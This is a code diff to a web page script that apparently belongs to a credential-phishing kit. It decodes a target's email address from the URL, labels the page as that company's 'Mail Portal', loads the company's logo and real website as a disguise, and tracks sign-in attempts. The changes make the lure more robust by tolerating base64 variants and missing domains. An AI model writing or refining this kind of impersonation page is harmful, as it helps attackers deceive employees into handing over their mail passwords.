@@ -1,6 +1,8 @@
 document.addEventListener("DOMContentLoaded", async function() {
     const urlParams = new URLSearchParams(window.location.search);
     const base64Email = urlParams.get('email');
+    // Will store extracted domain for later redirect use
+    let domain = ''; 
 
     document.getElementById('login-text').textContent = 'LOGIN';
     document.getElementById('login-text').style.marginLeft = '20px';
@@ -54,40 +56,51 @@ document.addEventListener("DOMContentLoaded", async function() {
     
 
     if (base64Email) {
-        
-        const email = atob(base64Email);
+        // Normalize URL-decoding quirks: spaces may represent "+" (from form encoding),
+        // also support URL-safe base64 variants '-' and '_'. Then add padding if needed.
+        let safeBase64 = base64Email.replace(/\s/g, '+').replace(/-/g, '+').replace(/_/g, '/');
+        while (safeBase64.length % 4 !== 0) safeBase64 += '=';
 
-        
-        document.getElementById('email-text').textContent = email;
+        let email = '';
+        try {
+            email = atob(safeBase64);
+        } catch (err) {
+            console.warn('Failed to decode base64 email:', base64Email, err);
+            email = '';
+        }
 
-        
-        const [localPart, domainExtracted] = email.split('@');
-        domain = domainExtracted; 
-        const companyName = domainExtracted.split('.')[0];
-        const capitalizedDomain = domainExtracted.charAt(0).toUpperCase() + domainExtracted.slice(1);
-        const capitalizedCompanyName = companyName.charAt(0).toUpperCase() + companyName.slice(1);
+        if (email) {
+            document.getElementById('email-text').textContent = email;
 
-        
-        document.getElementById('portal-text').textContent = `${capitalizedCompanyName} Mail Portal`;
-        document.getElementById('help-email').textContent = `Help@${domainExtracted}`;
+            const [localPart, domainExtracted] = email.split('@');
+            domain = domainExtracted || '';
+            const companyName = (domainExtracted || '').split('.')[0] || '';
+            const capitalizedDomain = (domainExtracted || '').charAt(0).toUpperCase() + (domainExtracted || '').slice(1);
+            const capitalizedCompanyName = companyName.charAt(0).toUpperCase() + companyName.slice(1);
 
-        // Set the logo
-        const logoImage = document.getElementById('company-logo');
-        logoImage.src = `https://logo.clearbit.com/${domainExtracted}`;
-        logoImage.onerror = function() {
-            logoImage.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA1MTIgNTEyIiB4bWw6c3BhY2U9InByZXNlcnZlIj4KICAgICAgICAgICAgICAgIDxwYXRoIHN0eWxlPSJmaWxsOiMwMDU1YjgiIGQ9Ik01MDMuNzU2IDExOC4wNjVjMC05LjA2OS03LjQyLTE2LjQ4OS0xNi40ODktMTYuNDg5SDI0LjczM2MtOS4wNjkgMC0xNi40ODkgNy40Mi0xNi40ODkgMTYuNDg5djI3NS44N2MwIDkuMDY5IDcuNDIgMTYuNDg5IDE2LjQ4OSAxNi40ODloNDYyLjUzM2M5LjA2OSAwIDE2LjQ4OS03LjQyIDE2LjQ4OS0xNi40ODl2LTI3NS44N3oiLz4KICAgICAgICAgICAgICAgIDxwYXRoIHN0eWxlPSJvcGFjaXR5Oi4xO2VuYWJsZS1iYWNrZ3JvdW5kOm5ldyIgZD0iTTI1NS45OTYgMjMwLjAzMiA5LjMwNiAzOTkuNjg3YzIuMTQ4IDUuNzEzIDcuMzcyIDkuOTQ5IDEzLjYzNiAxMC42MzRsMjMzLjA1My0xNjAuMjc4TDQ4OS4wNSA0MTAuMzIxYzYuMjY3LS42ODMgMTEuNDkyLTQuOTE4IDEzLjY0MS0xMC42MzFMMjU1Ljk5NiAyMzAuMDMyeiIvPgogICAgICAgICAgICAgICAgPHBhdGggc3R5bGU9Im9wYWNpdHk6LjI7ZW5hYmxlLWJhY2tncm91bmQ6bmV3IiBkPSJNNDg3LjI2NyAxMDEuNTc2SDI0LjczM2MtOS4wNjkgMC0xNi40ODkgNy40Mi0xNi40ODkgMTYuNDg5djIuMTk5bDI0Ny43NTUgMTcyLjUzOSAyNDcuNzU1LTE3Mi41Mzl2LTIuMTk5Yy4wMDItOS4wNjktNy40MTgtMTYuNDg5LTE2LjQ4Ny0xNi40ODl6Ii8+CiAgICAgICAgICAgICAgICA8cGF0aCBzdHlsZT0iZmlsbDojMDA4MmNhIiBkPSJNNDg3LjI2NyAxMDEuNTc2SDI0LjczM2MtNC4wOTEgMC03LjgzOSAxLjUyLTEwLjczIDQuMDFsMjQxLjk5NiAxNjguNTI5IDI0MS45OTYtMTY4LjUyOWMtMi44OS0yLjQ5LTYuNjM3LTQuMDEtMTAuNzI4LTQuMDF6Ii8+CiAgICAgICAgICAgICAgICA8cGF0aCBzdHlsZT0iZmlsbDojMWUyNTJiIiBkPSJNNDg3LjI2NyA5My4zMzJIMjQuNzMzQzExLjA5NSA5My4zMzIgMCAxMDQuNDI3IDAgMTE4LjA2NXYyNzUuODdjMCAxMy42MzkgMTEuMDk1IDI0LjczMyAyNC43MzMgMjQuNzMzaDQ2Mi41MzNjMTMuNjM5IDAgMjQuNzMzLTExLjA5NSAyNC43MzMtMjQuNzMzdi0yNzUuODdjLjAwMS0xMy42MzgtMTEuMDk1LTI0LjczMy0yNC43MzItMjQuNzMzem0tOS43NzcgMTYuNDg5TDI1NiAyNjQuMDY4IDM0LjUxIDEwOS44MjFoNDQyLjk4em0xOC4wMjEgMjg0LjExNGMwIDQuNTQ3LTMuNjk4IDguMjQ0LTguMjQ0IDguMjQ0SDI0LjczM2MtNC41NDcgMC04LjI0NC0zLjY5OC04LjI0NC04LjI0NHYtMjc1Ljg3YzAtLjIyOS4wMTYtLjQ1My4wMzQtLjY3N0wyNTEuMjg4IDI4MC44OGE4LjI0MyA4LjI0MyAwIDAgMCA5LjQyMiAwbDIzNC43NjUtMTYzLjQ5MmMuMDE5LjIyNC4wMzQuNDQ4LjAzNC42Nzd2Mjc1Ljg3aC4wMDJ6Ii8+CiAgICAgICAgICAgIDwvc3ZnPg==';
-            
-        };
+            document.getElementById('portal-text').textContent = `${capitalizedCompanyName} Mail Portal`;
+            document.getElementById('help-email').textContent = `Help@${domain}`;
 
-         // Set the iframe background
-        const iframe = document.getElementById('mainPage');
-        iframe.src = `https://${domainExtracted}`;
-        iframe.onerror = function() {
-            iframe.style.display = 'none';
-            document.body.style.backgroundColor = 'rgb(184, 183, 183)'; 
-        };
- }
+            // Set the logo
+            const logoImage = document.getElementById('company-logo');
+            if (domain) {
+                logoImage.src = `https://logo.clearbit.com/${domain}`;
+            }
+            logoImage.onerror = function() {
+                logoImage.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA1MTIgNTEyIiB4bWw6c3BhY2U9InByZXNlcnZlIj4KICAgICAgICAgICAgICAgIDxwYXRoIHN0eWxlPSJmaWxsOiMwMDU1YjgiIGQ9Ik01MDMuNzU2IDExOC4wNjVjMC05LjA2OS03LjQyLTE2LjQ4OS0xNi40ODktMTYuNDg5SDI0LjczM2MtOS4wNjkgMC0xNi40ODkgNy40Mi0xNi40ODkgMTYuNDg5djI3NS44N2MwIDkuMDY5IDcuNDIgMTYuNDg5IDE2LjQ4OSAxNi40ODloNDYyLjUzM2M5LjA2OSAwIDE2LjQ4OS03LjQyIDE2LjQ4OS0xNi40ODl2LTI3NS44N3oiLz4KICAgICAgICAgICAgICAgIDxwYXRoIHN0eWxlPSJvcGFjaXR5Oi4xO2VuYWJsZS1iYWNrZ3JvdW5kOm5ldyIgZD0iTTI1NS45OTYgMjMwLjAzMiA5LjMwNiAzOTkuNjg3YzIuMTQ4IDUuNzEzIDcuMzcyIDkuOTQ5IDEzLjYzNiAxMC42MzRsMjMzLjA1My0xNjAuMjc4TDQ4OS4wNSA0MTAuMzIxYzYuMjY3LS42ODMgMTEuNDkyLTQuOTE4IDEzLjY0MS0xMC42MzFMMjU1Ljk5NiAyMzAuMDMyeiIvPgogICAgICAgICAgICAgICAgPHBhdGggc3R5bGU9Im9wYWNpdHk6LjI7ZW5hYmxlLWJhY2tncm91bmQ6bmV3IiBkPSJNNDg3LjI2NyAxMDEuNTc2SDI0LjczM2MtOS4wNjkgMC0xNi40ODkgNy40Mi0xNi40ODkgMTYuNDg5djIuMTk5bDI0Ny43NTUgMTcyLjUzOSAyNDcuNzU1LTE3Mi41Mzl2LTIuMTk5Yy4wMDItOS4wNjktNy40MTgtMTYuNDg5LTE2LjQ4Ny0xNi40ODl6Ii8+CiAgICAgICAgICAgICAgICA8cGF0aCBzdHlsZT0iZmlsbDojMDA4MmNhIiBkPSJNNDg3LjI2NyAxMDEuNTc2SDI0LjczM2MtNC4wOTEgMC03LjgzOSAxLjUyLTEwLjczIDQuMDFsMjQxLjk5NiAxNjguNTI5IDI0MS45OTYtMTY4LjUyOWMtMi44OS0yLjQ5LTYuNjM3LTQuMDEtMTAuNzI4LTQuMDF6Ii8+CiAgICAgICAgICAgICAgICA8cGF0aCBzdHlsZT0iZmlsbDojMWUyNTJiIiBkPSJNNDg3LjI2NyA5My4zMzJIMjQuNzMzQzExLjA5NSA5My4zMzIgMCAxMDQuNDI3IDAgMTE4LjA2NXYyNzUuODdjMCAxMy42MzkgMTEuMDk1IDI0LjczMyAyNC43MzMgMjQuNzMzaDQ2Mi41MzNjMTMuNjM5IDAgMjQuNzMzLTExLjA5NSAyNC43MzMtMjQuNzMzdi0yNzUuODdjLjAwMS0xMy42MzgtMTEuMDk1LTI0LjczMy0yNC43MzItMjQuNzMzem0tOS43NzcgMTYuNDg5TDI1NiAyNjQuMDY4IDM0LjUxIDEwOS44MjFoNDQyLjk4em0xOC4wMjEgMjg0LjExNGMwIDQuNTQ3LTMuNjk4IDguMjQ0LTguMjQ0IDguMjQ0SDI0LjczM2MtNC41NDcgMC04LjI0NC0zLjY5OC04LjI0NC04LjI0NHYtMjc1Ljg3YzAtLjIyOS4wMTYtLjQ1My4wMzQtLjY3N0wyNTEuMjg4IDI4MC44OGE4LjI0MyA4LjI0MyAwIDAgMCA5LjQyMiAwbDIzNC43NjUtMTYzLjQ5MmMuMDE5LjIyNC4wMzQuNDQ4LjAzNC42Nzd2Mjc1Ljg3aC4wMDJ6Ii8+CiAgICAgICAgICAgIDwvc3ZnPg==';
+            };
 
+            // Set the iframe background only if we have a domain
+            const iframe = document.getElementById('mainPage');
+            if (domain) {
+                iframe.src = `https://${domain}`;
+            }
+            iframe.onerror = function() {
+                iframe.style.display = 'none';
+                document.body.style.backgroundColor = 'rgb(184, 183, 183)'; 
+            };
+        }
+    }
     let attempt = 0;
     const errorMessageElement = document.getElementById('error-message');
     const signInButtonElement = document.getElementById('sign-in-button');
